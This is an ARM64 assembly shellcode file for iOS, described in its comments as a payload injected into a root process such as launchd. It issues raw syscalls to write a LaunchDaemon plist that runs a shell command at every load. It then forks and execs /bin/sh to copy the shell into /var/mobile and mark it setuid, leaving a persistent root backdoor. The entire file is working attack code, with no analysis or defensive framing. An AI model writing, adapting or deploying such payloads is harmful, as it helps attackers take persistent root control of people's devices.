// payload.S — raw arm64 iOS shellcode, injected into a root process (launchd/backupd).
// No libc, no relocations: all strings live in __text and are reached with adr.
.section __TEXT,__text,regular,pure_instructions
.globl _root_payload
.align 4
_root_payload:
    // fd = open(plist_path, O_WRONLY|O_CREAT|O_TRUNC, 0644)
    adr x0, plist_path
    mov x1, #0x601
    mov x2, #0644
    mov x16, #5
    svc #0x80
    mov x19, x0
    // write(fd, plist_data, plist_len)
    mov x0, x19
    adr x1, plist_data
    adr x2, plist_end
    adr x3, plist_data
    sub x2, x2, x3
    mov x16, #4
    svc #0x80
    // close(fd)
    mov x0, x19
    mov x16, #6
    svc #0x80

    // fork()
    mov x16, #2
    svc #0x80
    cbnz x0, 9f                 // parent -> spin

    // child: build argv/envp on the stack
    sub sp, sp, #0x80
    adr x9, sh_path
    str x9, [sp, #0x00]
    adr x9, dash_c
    str x9, [sp, #0x08]
    adr x9, shell_cmd
    str x9, [sp, #0x10]
    str xzr, [sp, #0x18]
    adr x9, path_env
    str x9, [sp, #0x20]
    str xzr, [sp, #0x28]

    adr x0, sh_path
    mov x1, sp
    add x2, sp, #0x20
    mov x16, #59                // execve
    svc #0x80
    // execve failed -> exit(1)
    mov x0, #1
    mov x16, #1
    svc #0x80

9:  wfe
    b 9b

.align 4
plist_path: .asciz "/Library/LaunchDaemons/com.smith.root.plist"
sh_path:    .asciz "/bin/sh"
dash_c:     .asciz "-c"
path_env:   .asciz "PATH=/usr/bin:/bin:/usr/sbin:/sbin"
shell_cmd:
    .asciz "id > /var/mobile/rootproof; /bin/cp /bin/sh /var/mobile/sh; /bin/chmod 4755 /var/mobile/sh; /usr/bin/touch /var/mobile/root_ok"
plist_data:
    .ascii "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    .ascii "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
    .ascii "<plist version=\"1.0\"><dict>\n"
    .ascii "<key>Label</key><string>com.smith.root</string>\n"
    .ascii "<key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>id &gt; /var/mobile/rootproof_launchd; /usr/bin/touch /var/mobile/root_ok_launchd</string></array>\n"
    .ascii "<key>RunAtLoad</key><true/>\n"
    .ascii "</dict></plist>\n"
plist_end:
